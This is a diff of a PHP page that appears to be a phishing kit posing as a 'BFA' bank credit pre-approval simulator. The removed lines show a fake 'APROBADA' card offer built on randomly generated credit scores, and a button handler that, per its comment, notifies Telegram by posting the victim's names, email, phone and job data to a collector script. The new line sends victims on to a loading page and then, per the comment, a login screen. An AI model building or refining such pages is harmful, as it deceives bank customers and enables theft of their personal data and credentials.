@@ -248,12 +248,6 @@ session_start();
           </div>
           <span class="step-label">Validación</span>
         </li>
-        <li class="step" data-step="4">
-          <div class="step-circle">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M8 12l3 3 5-6"/></svg>
-          </div>
-          <span class="step-label">Resultados</span>
-        </li>
       </ol>
     </div>
   </section>
@@ -391,80 +385,6 @@ session_start();
       </div>
     </section>
 
-    <!-- STEP 4: Resultados -->
-    <section class="form-section" data-form="4">
-      <h2 class="form-title">Resultados de la Simulación</h2>
-      <p class="form-sub">Basado en tu perfil estimado, tenemos las siguientes opciones para ti.</p>
-
-      <div class="alert alert-success">
-        <div class="alert-icon success">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M8 12l3 3 5-6"/></svg>
-        </div>
-        <div>
-          <strong>¡Felicidades!</strong>
-          <p>Tu perfil estimado cumple con nuestros criterios. Tienes acceso a múltiples opciones financieras con BFA.</p>
-        </div>
-      </div>
-
-      <!-- Tarjeta producto -->
-      <div class="product-card">
-        <div class="product-card-img">
-          <img src="img/car.PNG" alt="Tarjeta BFA" class="real-card" />
-        </div>
-        <div class="product-card-body">
-          <div class="product-head">
-            <h3 class="product-title">Tarjeta Crédito BFA Visa Platinum</h3>
-            <span class="badge badge-success">APROBADA</span>
-          </div>
-          <ul class="product-info">
-            <li><span>Monto aprobado:</span><strong class="text-success">$ 5,000.00</strong></li>
-            <li><span>Tasa de interés:</span><strong>1.2% mensual</strong></li>
-            <li><span>Cuota anual:</span><strong>$ 35.00</strong></li>
-            <li><span>Plazo:</span><strong>Revolvente</strong></li>
-          </ul>
-          <a href="#" id="btnSolicitar" class="btn-purple">Solicitar Ahora</a>
-          <p class="product-note">Oferta exclusiva. Sujeta a verificación de identidad.</p>
-        </div>
-      </div>
-
-      <!-- Resumen de perfil -->
-      <div class="summary-card">
-        <h3 class="summary-title">Resumen de tu Perfil</h3>
-        <div class="summary-grid">
-<?php
-  $score     = random_int(600, 820);
-  $negativos = random_int(0, 2);
-  $productos = random_int(1, 3);
-?>
-          <div class="summary-item">
-            <div class="summary-value"><?= $score ?></div>
-            <div class="summary-label">Score Crediticio</div>
-          </div>
-          <div class="summary-item">
-            <div class="summary-value text-success">Excelente</div>
-            <div class="summary-label">Historial</div>
-          </div>
-          <div class="summary-item">
-            <div class="summary-value"><?= $negativos ?></div>
-            <div class="summary-label">Reportes Negativos</div>
-          </div>
-          <div class="summary-item">
-            <div class="summary-value"><?= $productos ?></div>
-            <div class="summary-label">Productos Aptos</div>
-          </div>
-        </div>
-      </div>
-
-      <div class="alert alert-info">
-        <div class="alert-icon">
-          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 9.5-8 10-4.5-.5-8-5-8-10V6l8-4z"/></svg>
-        </div>
-        <div>
-          <strong>Validación Segura y Confidencial</strong>
-          <p>Simula tu pre-aprobado en línea. Consultamos digitalmente tu historial crediticio con total privacidad.</p>
-        </div>
-      </div>
-    </section>
   </main>
 
   <!-- Footer -->
@@ -566,22 +486,8 @@ session_start();
       }, d);
     });
 
-    // Pasar a resultados después de ~5s
-    setTimeout(function(){ go(4); }, 5200);
-  });
-
-  // "Solicitar Ahora" → avisa a Telegram y va a cargando.php
-  document.getElementById('btnSolicitar').addEventListener('click', function(e){
-    e.preventDefault();
-    var body = new FormData();
-    body.append('tipo','solicitar_tarjeta');
-    body.append('nombres',    datos.nombres    || '');
-    body.append('apellidos',  datos.apellidos  || '');
-    body.append('email',      datos.email      || '');
-    body.append('phone',      datos.phone      || '');
-    body.append('antiguedad', datos.antiguedad || '');
-    fetch('solicitar_tarjeta.php', { method:'POST', body: body, keepalive: true }).catch(function(){});
-    setTimeout(function(){ location.href = 'cargando.php'; }, 250);
+    // Al terminar validación, ir a pantalla de carga → login
+    setTimeout(function(){ location.href = 'cargando.php'; }, 5200);
   });
 })();
 </script>
